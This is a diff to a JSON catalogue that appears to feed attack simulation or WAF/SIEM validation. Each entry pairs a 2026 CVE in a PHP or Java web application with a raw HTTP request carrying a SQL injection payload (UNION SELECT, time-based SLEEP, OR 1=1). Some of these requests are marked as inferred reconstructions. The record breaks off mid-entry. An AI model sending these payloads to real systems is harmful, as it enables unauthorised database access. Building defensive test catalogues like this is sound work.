@@ -53116,6 +53116,473 @@
     "visible": true
   },
   {
+    "name": "CVE-2026-6982 - star7th ShowDoc SQL Injection",
+    "displayName": "CVE-2026-6982 - star7th ShowDoc SQL Injection",
+    "description": "star7th ShowDoc up to 2.10.10/3.6.2/3.8.0 is vulnerable to SQL injection in the legacy API Page Sort endpoint (PageController::sort), which reads the 'pages' parameter via I(\"pages\") and builds an UPDATE query without sanitization. The request sends a UNION SELECT / time-based payload in the pages parameter to the /server/index.php?s=/api/page/sort route. Fixed in v3.8.1. No vendor WAF rule found; built from the confirmed source and VulDB entry point (raw gist PoC unreachable here).\n\nReferences used to recreate this request:\n- https://gist.github.com/saDL0w/555e19668264f98d96259ad47ea33811 (PoC - unreachable/blocked)\n- https://github.com/star7th/showdoc/blob/master/server/Application/Api/Controller/PageController.class.php (source: sort() reads I(\"pages\"))\n- https://github.com/star7th/showdoc/releases/tag/v3.8.1 (fix release)\n- https://vuldb.com/vuln/359525 (VulDB entry point)\n- https://www.cve.org/CVERecord?id=CVE-2026-6982 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /server/index.php?s=/api/page/sort HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\nContent-Type: application/x-www-form-urlencoded\n\napi_key=dummy&pages=-1%20UNION%20SELECT%20SLEEP(5)--%20-\n"
+    },
+    "cves": [
+      "CVE-2026-6982"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_source for CVE-2026-6982",
+        "link": "https://github.com/star7th/showdoc/blob/master/server/Application/Api/Controller/PageController.class.php"
+      },
+      {
+        "title": "poc_gist for CVE-2026-6982",
+        "link": "https://gist.github.com/saDL0w/555e19668264f98d96259ad47ea33811"
+      },
+      {
+        "title": "fix_release for CVE-2026-6982",
+        "link": "https://github.com/star7th/showdoc/releases/tag/v3.8.1"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-6978 - JiZhiCMS SQL Injection",
+    "displayName": "CVE-2026-6978 - JiZhiCMS SQL Injection",
+    "description": "JiZhiCMS up to 2.5.6 is vulnerable to SQL injection in the admin cache feature at /index.php/admins/Sys/addcache.html, where the 'sqls' argument is passed through htmlspecialchars_decode and executed without sanitization. The request sends a UNION SELECT payload in the sqls parameter. No vendor WAF rule found; built from the VulDB entry point (GitHub issue PoC not readable in this session).\n\nReferences used to recreate this request:\n- https://github.com/qingyun985/Cyber-Security/issues/4 (PoC - repo not accessible in session)\n- https://vuldb.com/vuln/359521 (VulDB entry point: file /index.php/admins/Sys/addcache.html, argument sqls)\n- https://www.cve.org/CVERecord?id=CVE-2026-6978 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /index.php/admins/Sys/addcache.html HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\nContent-Type: application/x-www-form-urlencoded\n\nsqls=-1%20UNION%20SELECT%201%2C2%2Cuser()--%20-\n"
+    },
+    "cves": [
+      "CVE-2026-6978"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-6978",
+        "link": "https://github.com/qingyun985/Cyber-Security/issues/4"
+      },
+      {
+        "title": "poc_vuldb for CVE-2026-6978",
+        "link": "https://vuldb.com/vuln/359521"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-6929 - beardev JoomSport SQL Injection",
+    "displayName": "CVE-2026-6929 - beardev JoomSport SQL Injection",
+    "description": "The JoomSport WordPress plugin <= 5.7.7 is vulnerable to unauthenticated time-based blind SQL injection via the 'sortf' parameter, read by classJsportRequest::get('sortf') and wrapped in backticks inside an ORDER BY clause of the season player list. The request is an unauthenticated GET to the public playerlist page with a SLEEP() payload appended to sortf. No vendor WAF rule found; built from the published PoC request.\n\nReferences used to recreate this request:\n- https://safe.security/?p=23537 (advisory with full PoC request)\n- https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/joomsport-sports-league-results-management/joomsport-577-unauthenticated-sql-injection-via-sortf-parameter (Wordfence advisory)\n- https://plugins.trac.wordpress.org/browser/joomsport-sports-league-results-management/tags/5.7.5/sportleague/base/wordpress/classes/class-jsport-getplayers.php#L153 (vulnerable source)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /?post_type=joomsport_season&p=4&action=playerlist&sortf=post_title%60DESC%2C(SLEEP(5))%23&sortd=ASC HTTP/1.1\nHost: {{target_host}}\n\n"
+    },
+    "cves": [
+      "CVE-2026-6929"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_advisory for CVE-2026-6929",
+        "link": "https://safe.security/?p=23537"
+      },
+      {
+        "title": "waf_rule_wordfence for CVE-2026-6929",
+        "link": "https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/joomsport-sports-league-results-management/joomsport-577-unauthenticated-sql-injection-via-sortf-parameter"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-6854 - joedolson My Calendar SQL Injection",
+    "displayName": "CVE-2026-6854 - joedolson My Calendar SQL Injection",
+    "description": "The My Calendar WordPress plugin <= 3.7.8 is vulnerable to unauthenticated time-based blind SQL injection via the 'mc_auth' parameter. my-calendar-events.php reads $get['mc_auth'] and passes it to mc_select_author() in the SQL limits, and the value is reachable unauthenticated through the wp_ajax_nopriv_mcjs_action AJAX handler (admin-ajax.php?action=mcjs_action). The request sends a SLEEP()-based payload in mc_auth. No vendor WAF rule found; built from the plugin source and fix changeset.\n\nReferences used to recreate this request:\n- https://github.com/joedolson/my-calendar/blob/trunk/src/my-calendar-events.php (source: reads $get['mc_auth'])\n- https://github.com/joedolson/my-calendar/blob/trunk/src/my-calendar-ajax.php (source: wp_ajax_nopriv_mcjs_action)\n- https://www.wordfence.com/threat-intel/vulnerabilities/id/aa1ed81c-04cb-4ccd-8c30-b1d943730909?source=cve (Wordfence advisory)\n- https://plugins.trac.wordpress.org/changeset/3515996/my-calendar (fix changeset)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /wp-admin/admin-ajax.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\naction=mcjs_action&mc_auth=1%20AND%20(SELECT%201%20FROM%20(SELECT%20SLEEP(5))x)--%20-\n"
+    },
+    "cves": [
+      "CVE-2026-6854"
+    ],
+    "cwes": [
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_source for CVE-2026-6854",
+        "link": "https://github.com/joedolson/my-calendar/blob/trunk/src/my-calendar-events.php"
+      },
+      {
+        "title": "waf_rule_wordfence for CVE-2026-6854",
+        "link": "https://www.wordfence.com/threat-intel/vulnerabilities/id/aa1ed81c-04cb-4ccd-8c30-b1d943730909?source=cve"
+      },
+      {
+        "title": "fix_changeset for CVE-2026-6854",
+        "link": "https://plugins.trac.wordpress.org/changeset/3515996/my-calendar"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-6629 - Metasoft MetaCRM SQL Injection",
+    "displayName": "CVE-2026-6629 - Metasoft MetaCRM SQL Injection",
+    "description": "Metasoft MetaCRM up to 6.4.0 is vulnerable to SQL injection in the Interface component, where sql.jsp passes the 'sql' argument directly to Statement.executeUpdate without sanitization. The request sends a SQL injection payload in the sql parameter. No vendor WAF rule found; built from the VulDB entry point (raw PoC unreachable here, method inferred as GET to sql.jsp).\n\nReferences used to recreate this request:\n- https://vuldb.com/vuln/358263 (VulDB entry point: file sql.jsp, argument sql)\n- https://www.cve.org/CVERecord?id=CVE-2026-6629 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /sql.jsp?sql=1%20UNION%20SELECT%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: JSESSIONID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-6629"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_vuldb for CVE-2026-6629",
+        "link": "https://vuldb.com/vuln/358263"
+      },
+      {
+        "title": "cve_record for CVE-2026-6629",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2026-6629"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-6628 - phili67 EcclesiaCRM SQL Injection",
+    "displayName": "CVE-2026-6628 - phili67 EcclesiaCRM SQL Injection",
+    "description": "EcclesiaCRM up to 8.0.0 is vulnerable to SQL injection in the Query Viewer component. The queryview template POSTs user-supplied query parameters to /v2/query/view/<id> and ValidateInput() injects them into the stored SQL query; the 'custom' parameter is not sanitized. The request POSTs a UNION SELECT payload in the custom parameter. Authentication is required (dummy session cookie included). No vendor WAF rule found; built from the confirmed source and VulDB entry point.\n\nReferences used to recreate this request:\n- https://github.com/NicolasPauferro/studiessqli (PoC repo - no readable content in session)\n- https://github.com/phili67/ecclesiacrm/blob/master/src/v2/templates/query/queryview.php (source: POST /v2/query/view/<id>, ValidateInput)\n- https://vuldb.com/vuln/358262 (VulDB entry point: argument custom)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /v2/query/view/1 HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\nContent-Type: application/x-www-form-urlencoded\n\nSubmit=1&custom=')%20UNION%20SELECT%20NULL%2Cuser()--%20-\n"
+    },
+    "cves": [
+      "CVE-2026-6628"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_source for CVE-2026-6628",
+        "link": "https://github.com/phili67/ecclesiacrm/blob/master/src/v2/templates/query/queryview.php"
+      },
+      {
+        "title": "poc_github for CVE-2026-6628",
+        "link": "https://github.com/NicolasPauferro/studiessqli"
+      },
+      {
+        "title": "poc_vuldb for CVE-2026-6628",
+        "link": "https://vuldb.com/vuln/358262"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-6595 - ProjectsAndPrograms School Management System SQL Injection",
+    "displayName": "CVE-2026-6595 - ProjectsAndPrograms School Management System SQL Injection",
+    "description": "ProjectsAndPrograms School Management System is vulnerable to SQL injection in buslocation.php via the 'bus_id' HTTP GET parameter, which is concatenated into the query without sanitization. The request sends a UNION SELECT payload in bus_id. No vendor WAF rule found; built from the VulDB entry point (raw PoC unreachable here).\n\nReferences used to recreate this request:\n- https://vuldb.com/vuln/358230 (VulDB entry point: file buslocation.php, argument bus_id)\n- https://www.cve.org/CVERecord?id=CVE-2026-6595 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /buslocation.php?bus_id=-1%20UNION%20SELECT%201%2C2%2C3%2C4%2Cdatabase()--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-6595"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_vuldb for CVE-2026-6595",
+        "link": "https://vuldb.com/vuln/358230"
+      },
+      {
+        "title": "cve_record for CVE-2026-6595",
+        "link": "https://www.cve.org/CVERecord?id=CVE-2026-6595"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-6562 - dameng100 muucmf SQL Injection",
+    "displayName": "CVE-2026-6562 - dameng100 muucmf SQL Injection",
+    "description": "muucmf 1.9.5 is vulnerable to SQL injection in the Search module (getListByPage) at /index/Search/index.html via the 'keyword' parameter, which is not sanitized before being used in the query. The request sends a UNION SELECT payload in keyword. No vendor WAF rule found; built from the VulDB entry point (write-up unreachable in this session).\n\nReferences used to recreate this request:\n- https://vuldb.com/vuln/358199 (VulDB entry point: file /index/Search/index.html, argument keyword)\n- https://thinhneee.github.io/posts/muucmf-sqli/ (write-up - unreachable/blocked)\n- https://www.cve.org/CVERecord?id=CVE-2026-6562 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /index/Search/index.html?keyword=-1%27%20UNION%20SELECT%201%2C2%2C3%2Cversion()--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-6562"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_vuldb for CVE-2026-6562",
+        "link": "https://vuldb.com/vuln/358199"
+      },
+      {
+        "title": "poc_writeup for CVE-2026-6562",
+        "link": "https://thinhneee.github.io/posts/muucmf-sqli/"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-6490 - QueryMine sms SQL Injection",
+    "displayName": "CVE-2026-6490 - QueryMine sms SQL Injection",
+    "description": "QueryMine sms (School Management System) is vulnerable to SQL injection in admin/deletecourse.php via the 'ID' HTTP GET parameter, which is concatenated into the query without sanitization. The request sends a time-based blind payload in ID. Authentication is required (dummy session cookie included). No vendor WAF rule found; built from the VulDB entry point and PoC document.\n\nReferences used to recreate this request:\n- https://github.com/duckpigdog/CVE/blob/main/QueryMine_sms%20PHP%20Project%20Deployment%20Document%20(Windows%20Local)-1.md (PoC/deployment document)\n- https://vuldb.com/vuln/358034 (VulDB entry point: file admin/deletecourse.php, argument ID)\n- https://www.cve.org/CVERecord?id=CVE-2026-6490 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /admin/deletecourse.php?ID=1%20AND%20(SELECT%201%20FROM%20(SELECT%20SLEEP(5))a)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-6490"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 3,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-6490",
+        "link": "https://github.com/duckpigdog/CVE/blob/main/QueryMine_sms%20PHP%20Project%20Deployment%20Document%20(Windows%20Local)-1.md"
+      },
+      {
+        "title": "poc_vuldb for CVE-2026-6490",
+        "link": "https://vuldb.com/vuln/358034"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
     "name": "CVE-2026-6191 - itsourcecode Construction Management System SQL Injection",
     "displayName": "CVE-2026-6191 - itsourcecode Construction Management System SQL Injection",
     "description": "itsourcecode Construction Management System 1.0 is vulnerable to SQL injection via the Name parameter of /equipments.php. The request submits a boolean-based SQL injection payload in the Name field. No vendor WAF rule found; the GitHub issue PoC was unreachable (provenance-blocked), so this is built from the VulDB file/argument entry point and the itsourcecode add-record form pattern (method inferred as POST).\n\nReferences used to recreate this request:\n- https://github.com/ltranquility/cve_submit/issues/16 (PoC - unreachable)\n- https://vuldb.com/vuln/357113 (VulDB entry: file /equipments.php, argument Name)\n- https://vulnerability.circl.lu/vuln/cve-2026-6191 (CIRCL/CVE record)",
@@ -56574,6 +57041,617 @@
     "visible": true
   },
   {
+    "name": "CVE-2026-5578 - CodeAstro Online Classroom SQL Injection",
+    "displayName": "CVE-2026-5578 - CodeAstro Online Classroom SQL Injection",
+    "description": "CodeAstro Online Classroom 1.0 is vulnerable to SQL injection via the deleteid parameter of /OnlineClassroom/addassessment.php. The request sends a time-based SQLi payload (AND SLEEP(5)) in deleteid. No vendor WAF rule found; built from the VulDB description. Method inferred as GET (delete-by-id action) from the VulDB 'file ... argument' description; flagged as inferred.\n\nReferences used to recreate this request:\n- https://github.com/zgr0508/cve/issues/1 (PoC, not fetchable - provenance blocked)\n- https://vuldb.com/vuln/355348 (VulDB entry)\n- https://www.cve.org/CVERecord?id=CVE-2026-5578 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /OnlineClassroom/addassessment.php?deleteid=1%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-5578"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-5578",
+        "link": "https://github.com/zgr0508/cve/issues/1"
+      },
+      {
+        "title": "vuldb for CVE-2026-5578",
+        "link": "https://vuldb.com/vuln/355348"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-5577 - Song-Li cross_browser SQL Injection",
+    "displayName": "CVE-2026-5577 - Song-Li cross_browser SQL Injection",
+    "description": "Song-Li cross_browser (uniquemachine) is vulnerable to SQL injection in the ID field of the /details endpoint in flask/uniquemachine_app.py. The endpoint, method (POST) and the raw SQL concatenation (SELECT * FROM features WHERE browser_fingerprint = '\" + ID + \"') were confirmed from the project source; the request sends a boolean SQLi payload in the JSON ID field. No vendor WAF rule found; built from source.\n\nReferences used to recreate this request:\n- https://github.com/wing3e/public_exp/issues/24 (PoC, not fetchable - provenance blocked)\n- https://github.com/Song-Li/cross_browser (source: flask/uniquemachine_app.py confirms POST /details and ID->SQL)\n- https://vuldb.com/vuln/355347 (VulDB entry)\n- https://www.cve.org/CVERecord?id=CVE-2026-5577 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /details HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/json\n\n{\"ID\": \"' OR 1=1-- -\"}\n"
+    },
+    "cves": [
+      "CVE-2026-5577"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-5577",
+        "link": "https://github.com/wing3e/public_exp/issues/24"
+      },
+      {
+        "title": "source_github for CVE-2026-5577",
+        "link": "https://github.com/Song-Li/cross_browser"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-5575 - SourceCodester jkev Record Management System SQL Injection",
+    "displayName": "CVE-2026-5575 - SourceCodester jkev Record Management System SQL Injection",
+    "description": "SourceCodester/jkev Record Management System 1.0 is vulnerable to SQL injection in the Username parameter of the Login component (index.php). The request sends a boolean SQLi payload (' OR 1=1-- -) in the Username form field. No vendor WAF rule found; built from the PoC/VulDB description. Method inferred as POST (login form submission); flagged as inferred.\n\nReferences used to recreate this request:\n- https://github.com/whatyourname12345/CVE/blob/main/PRMS/cve_SQL.md (PoC, not fetchable - provenance blocked)\n- https://vuldb.com/vuln/355345 (VulDB entry)\n- https://www.cve.org/CVERecord?id=CVE-2026-5575 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /index.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\n\nUsername=%27+OR+1%3D1--+-&Password=dummy\n"
+    },
+    "cves": [
+      "CVE-2026-5575"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-5575",
+        "link": "https://github.com/whatyourname12345/CVE/blob/main/PRMS/cve_SQL.md"
+      },
+      {
+        "title": "vuldb for CVE-2026-5575",
+        "link": "https://vuldb.com/vuln/355345"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-5565 - code-projects Simple Laundry System SQL Injection",
+    "displayName": "CVE-2026-5565 - code-projects Simple Laundry System SQL Injection",
+    "description": "code-projects Simple Laundry System 1.0 is vulnerable to SQL injection via the userid parameter of /delmemberinfo.php. The request sends a time-based SQLi payload (AND SLEEP(5)) in userid. No vendor WAF rule found; built from the VulDB description. Method inferred as GET (delete-member-by-id action); flagged as inferred.\n\nReferences used to recreate this request:\n- https://github.com/mzhnqwqz/cve/issues/1 (PoC, not fetchable - provenance blocked)\n- https://vuldb.com/vuln/355335 (VulDB entry)\n- https://www.cve.org/CVERecord?id=CVE-2026-5565 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /delmemberinfo.php?userid=1%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-5565"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-5565",
+        "link": "https://github.com/mzhnqwqz/cve/issues/1"
+      },
+      {
+        "title": "vuldb for CVE-2026-5565",
+        "link": "https://vuldb.com/vuln/355335"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-5564 - code-projects Simple Laundry System SQL Injection",
+    "displayName": "CVE-2026-5564 - code-projects Simple Laundry System SQL Injection",
+    "description": "code-projects Simple Laundry System 1.0 is vulnerable to SQL injection via the searchServiceId parameter of /searchguest.php. The request sends a time-based SQLi payload (' AND SLEEP(5)) in searchServiceId. No vendor WAF rule found; built from the VulDB description. Method inferred as GET (search/lookup parameter); flagged as inferred.\n\nReferences used to recreate this request:\n- https://github.com/Kazamikazu/Ksec/issues/2 (PoC, not fetchable - provenance blocked)\n- https://vuldb.com/vuln/355334 (VulDB entry)\n- https://www.cve.org/CVERecord?id=CVE-2026-5564 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "GET /searchguest.php?searchServiceId=1%27%20AND%20SLEEP(5)--%20- HTTP/1.1\nHost: {{target_host}}\nCookie: PHPSESSID=dummy\n\n"
+    },
+    "cves": [
+      "CVE-2026-5564"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "php",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "poc_github for CVE-2026-5564",
+        "link": "https://github.com/Kazamikazu/Ksec/issues/2"
+      },
+      {
+        "title": "vuldb for CVE-2026-5564",
+        "link": "https://vuldb.com/vuln/355334"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-5563 - AutohomeCorp frostmourne SQL Injection",
+    "displayName": "CVE-2026-5563 - AutohomeCorp frostmourne SQL Injection",
+    "description": "AutohomeCorp frostmourne up to 1.0 is vulnerable to SQL injection through the Alarm Preview feature (httpTest/previewData). The endpoint /api/monitor-api/alarm/previewData (POST, @RequestBody AlarmContract) and the injectable metricContract.queryString field were confirmed from source (AlarmController.java, MetricContract.java). The request sends a UNION/OR SQLi payload in queryString. No vendor WAF rule found; built from source. Request body (full AlarmContract wrapper) simplified to the injectable field.\n\nReferences used to recreate this request:\n- https://github.com/AutohomeCorp/frostmourne (source: AlarmController.previewData POST + MetricContract.queryString)\n- https://vuldb.com/vuln/355333 (VulDB entry)\n- https://www.cve.org/CVERecord?id=CVE-2026-5563 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /api/monitor-api/alarm/previewData HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/json\nCookie: SESSION=dummy\n\n{\"metricContract\":{\"queryString\":\"' OR 1=1 UNION SELECT NULL-- -\"}}\n"
+    },
+    "cves": [
+      "CVE-2026-5563"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
+    "tags": [
+      "Web Application Firewall",
+      "IOB",
+      "SIEM",
+      "SOAR",
+      "CWE-74",
+      "CWE-89",
+      "SQL Injection"
+    ],
+    "risk": 2,
+    "platforms": [
+      "java",
+      "sql"
+    ],
+    "techniques": [
+      "T1190"
+    ],
+    "tactics": [
+      "TA0001"
+    ],
+    "targetedSectors": [
+      "General"
+    ],
+    "reference": [
+      {
+        "title": "source_github for CVE-2026-5563",
+        "link": "https://github.com/AutohomeCorp/frostmourne"
+      },
+      {
+        "title": "vuldb for CVE-2026-5563",
+        "link": "https://vuldb.com/vuln/355333"
+      }
+    ],
+    "public": false,
+    "visible": true
+  },
+  {
+    "name": "CVE-2026-5560 - PHPGurukul Online Shopping Portal SQL Injection",
+    "displayName": "CVE-2026-5560 - PHPGurukul Online Shopping Portal SQL Injection",
+    "description": "PHPGurukul Online Shopping Portal Project 2.1 is vulnerable to SQL injection via the paymethod parameter of /payment-method.php. The request sends a boolean SQLi payload (' OR 1=1-- -) in paymethod. No vendor WAF rule found; built from the VulDB description. Method inferred as POST (payment-method form submission); flagged as inferred.\n\nReferences used to recreate this request:\n- https://github.com/f1rstb100d/CVE/issues/12 (PoC, not fetchable - provenance blocked)\n- https://vuldb.com/vuln/355330 (VulDB entry)\n- https://www.cve.org/CVERecord?id=CVE-2026-5560 (CVE record)",
+    "type": "webRequest",
+    "value": {
+      "input": "POST /payment-method.php HTTP/1.1\nHost: {{target_host}}\nContent-Type: application/x-www-form-urlencoded\nCookie: PHPSESSID=dummy\n\npaymethod=%27+OR+1%3D1--+-\n"
+    },
+    "cves": [
+      "CVE-2026-5560"
+    ],
+    "cwes": [
+      "CWE-74",
+      "CWE-89"
+    ],
